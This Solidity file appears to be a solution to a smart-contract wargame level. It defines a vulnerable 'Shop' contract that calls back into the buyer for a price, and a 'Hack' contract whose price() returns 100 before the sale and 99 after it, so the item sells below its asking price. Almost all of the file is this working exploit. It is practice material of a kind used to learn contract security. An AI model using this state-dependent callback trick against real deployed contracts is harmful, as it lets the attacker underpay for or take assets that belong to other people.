// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack{
    Shop private immutable victim;

    constructor(address _victimAddr){
        victim = Shop(_victimAddr);
    }
    // this will be the function that will break the Shop contract
    function pwn() external{
        victim.buy();
        require(victim.price() == 99, "Price != 99");
    }

    function price() external view returns (uint){
        if (victim.isSold()){
            // 2nd call
            return 99;
        }
        // 1st call
        return 100;
    }
}